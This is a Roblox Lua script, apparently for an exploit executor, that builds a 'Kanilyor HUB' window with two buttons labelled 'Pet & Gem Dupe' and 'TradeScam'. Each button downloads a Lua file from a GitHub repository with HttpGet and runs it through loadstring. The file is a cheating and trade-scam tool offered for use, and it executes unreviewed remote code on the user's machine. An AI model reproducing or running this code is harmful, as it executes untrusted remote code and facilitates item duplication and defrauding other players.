-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local wrealt = Instance.new("Frame")
local dupebutton = Instance.new("ImageButton")
local scambutton = Instance.new("ImageButton")
local dupelabel = Instance.new("TextLabel")
local scamlabel = Instance.new("TextLabel")
local kanilyorhub = Instance.new("TextLabel")
local madeby = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 5
main.Position = UDim2.new(0.359781146, 0, 0.34074074, 0)
main.Size = UDim2.new(0, 409, 0, 258)
main.Active = true
main.Draggable = true

wrealt.Name = "wrealt"
wrealt.Parent = main
wrealt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
wrealt.Position = UDim2.new(0.489982843, 0, 0.302612692, 0)
wrealt.Size = UDim2.new(0, 6, 0, 100)

dupebutton.Name = "dupebutton"
dupebutton.Parent = main
dupebutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dupebutton.Position = UDim2.new(0.173716635, 0, 0.302612692, 0)
dupebutton.Size = UDim2.new(0, 100, 0, 100)
dupebutton.Image = "http://www.roblox.com/asset/?id=12388444813"
dupebutton.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Radexrow/psx/main/dupe.lua", true))()
end)

scambutton.Name = "scambutton"
scambutton.Parent = main
scambutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scambutton.Position = UDim2.new(0.581767082, 0, 0.302612692, 0)
scambutton.Size = UDim2.new(0, 100, 0, 100)
scambutton.Image = "http://www.roblox.com/asset/?id=12388709330"
scambutton.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Radexrow/psx/main/tradescam.lua", true))()
end)

dupelabel.Name = "dupelabel"
dupelabel.Parent = main
dupelabel.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
dupelabel.BorderSizePixel = 0
dupelabel.Position = UDim2.new(0.103781991, 0, 0.739333987, 0)
dupelabel.Size = UDim2.new(0, 157, 0, 32)
dupelabel.Font = Enum.Font.FredokaOne
dupelabel.Text = "Pet & Gem Dupe"
dupelabel.TextColor3 = Color3.fromRGB(0, 0, 0)
dupelabel.TextSize = 25.000

scamlabel.Name = "scamlabel"
scamlabel.Parent = main
scamlabel.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
scamlabel.BorderSizePixel = 0
scamlabel.Position = UDim2.new(0.511832476, 0, 0.739333987, 0)
scamlabel.Size = UDim2.new(0, 157, 0, 32)
scamlabel.Font = Enum.Font.FredokaOne
scamlabel.Text = "TradeScam"
scamlabel.TextColor3 = Color3.fromRGB(0, 0, 0)
scamlabel.TextSize = 25.000

kanilyorhub.Name = "kanilyorhub"
kanilyorhub.Parent = main
kanilyorhub.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
kanilyorhub.BorderSizePixel = 0
kanilyorhub.Position = UDim2.new(-0.00207707286, 0, -0.000344544649, 0)
kanilyorhub.Size = UDim2.new(0, 409, 0, 50)
kanilyorhub.Font = Enum.Font.FredokaOne
kanilyorhub.Text = "Kanilyor HUB - V2"
kanilyorhub.TextColor3 = Color3.fromRGB(0, 0, 0)
kanilyorhub.TextSize = 25.000

madeby.Name = "madeby"
madeby.Parent = main
madeby.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
madeby.BorderSizePixel = 0
madeby.Position = UDim2.new(0.734371126, 0, 0.915044546, 0)
madeby.Size = UDim2.new(0, 107, 0, 21)
madeby.Font = Enum.Font.FredokaOne
madeby.Text = "Kanilyor Discord"
madeby.TextColor3 = Color3.fromRGB(0, 255, 0)
madeby.TextSize = 15.000